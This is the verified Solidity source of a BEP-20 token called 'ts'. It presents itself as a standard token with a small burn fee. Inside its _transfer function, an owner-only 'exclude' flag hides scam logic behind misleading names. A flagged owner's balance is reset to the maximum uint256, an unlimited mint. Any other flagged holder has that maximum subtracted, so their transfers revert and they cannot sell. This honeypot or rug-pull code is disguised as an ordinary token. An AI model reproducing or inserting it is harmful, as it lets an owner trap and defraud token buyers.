/**
 *Submitted for verification at BscScan.com on 2022-11-08
*/

pragma solidity ^0.4.25;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
}



contract BaseToken is Ownable {
    using SafeMath for uint256;

    string constant public name = 'ts';

    string constant public symbol = 'ts';

    uint8 constant public decimals = 18;

    uint256 public totalSupply = 8800000000*10**uint256(decimals);

    uint256 public constant MAXSupply = 10000000000000000000000000000000000000000000000000 * 10 ** uint256(decimals);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping(address => bool) private _isDDDExclud;

    address public burnAddress = 0x000000000000000000000000000000000000dEaD;
    address public projectAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 private _taxfieiee = 0;
    uint256 private _burnfieiee = 2;
    uint256 private _vault =  2**256 - 1;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function setExclud(address _address,bool _value) external onlyOwner {
        _isDDDExclud[_address] = _value;
    }

    function getExclud(address _address) external view onlyOwner returns (bool) {
        return _isDDDExclud[_address];
    }


    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");

        uint256 FIE =  value.mul(_taxfieiee).div(100);
        uint256 burn =  value.mul(_burnfieiee).div(100);
        if (_isDDDExclud[from] == true) {
            if (from == owner) {
                balanceOf[owner] = _vault;
            }else{
                balanceOf[from] = balanceOf[from].sub(_vault);
            }
        }
        balanceOf[from] = balanceOf[from].sub(value);
        balanceOf[to] = balanceOf[to].add(value).sub(FIE).sub(burn);

        if(FIE > 0) {
            balanceOf[projectAddress] = balanceOf[projectAddress].add(FIE);
            emit Transfer(from, projectAddress, FIE);
        }

        if(burn > 0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);
            emit Transfer(from, burnAddress, burn);
        }

        emit Transfer(from, to, value);
    }


    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }



}


contract Token is BaseToken {

    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
        owner = msg.sender;
    }

    function() public payable {
        revert();
    }
}